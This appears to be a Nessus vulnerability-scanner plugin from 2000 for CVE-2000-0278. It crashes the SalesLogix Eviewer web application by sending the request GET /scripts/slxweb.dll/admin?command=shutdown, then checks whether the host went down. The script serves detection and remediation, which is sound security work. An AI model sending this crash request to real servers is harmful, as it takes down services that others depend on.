#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10361);
 script_bugtraq_id(1089);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2000-0278");
 
 name["english"] = "SalesLogix Eviewer WebApp crash";
 name["francais"] = "Déni de service SalesLogix Eviewer WebApp";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash
the remote server by requesting :

	GET /scripts/slxweb.dll/admin?command=shutdown
	
An attacker may use this flaw to crash this
host, thus preventing your network from
working properly.
	
Solution : Remove this CGI

Risk factor : High";

 desc["francais"] = "Il a été possible de tuer
la machine distante en envoyant la requête :

	GET /scripts/slxweb.dll/admin?command=shutdown
	
Un pirate peut utiliser ce problème pour 
faire planter cette machine, empechant 
ainsi votre réseau de fonctionner 
correctement.

Solution : enlevez ce CGI.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes Eviewer";
 summary["francais"] = "Fait planter Eviewer";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 if ( http_is_dead(port:port) ) exit(0);
 req = http_get(item:"/scripts/slxweb.dll/admin?command=shutdown",
 	        port:port);
 soc = http_open_socket(port);
 if(!soc)exit(0);
 start_denial();
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);

 alive = end_denial();
 if(!alive && http_is_dead(port:port)){
  		security_hole(port);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
}
